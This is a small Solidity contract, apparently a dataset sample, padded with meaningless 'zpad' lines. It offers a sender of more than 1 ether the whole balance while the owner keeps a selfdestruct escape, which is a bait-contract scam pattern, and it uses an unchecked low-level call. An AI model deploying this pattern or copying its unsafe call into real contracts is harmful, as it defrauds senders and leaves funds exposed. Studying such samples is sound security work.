pragma solidity ^0.4.19;
contract SPRING_BOARD_1_ETH
{
 address owner = msg.sender;
 function() public payable {}
 function Jump() public payable {
    uint256 zpad0 = 0; zpad0 = zpad0 + 1;
    uint256 zpad1 = 1; zpad1 = zpad1 + 1;
    uint256 zpad2 = 2; zpad2 = zpad2 + 1;
    uint256 zpad3 = 3; zpad3 = zpad3 + 1;
    uint256 zpad4 = 4; zpad4 = zpad4 + 1;
    uint256 zpad5 = 5; zpad5 = zpad5 + 1;
    uint256 zpad6 = 6; zpad6 = zpad6 + 1;
    uint256 zpad7 = 7; zpad7 = zpad7 + 1;
    uint256 zpad8 = 8; zpad8 = zpad8 + 1;
    uint256 zpad9 = 9; zpad9 = zpad9 + 1;

 if(msg.value > 1 ether) {
 msg.sender.call.value(this.balance)();
 }
 }
 function Kill() public payable {
 if(msg.sender==owner) {
 selfdestruct(owner);
 }
 }
}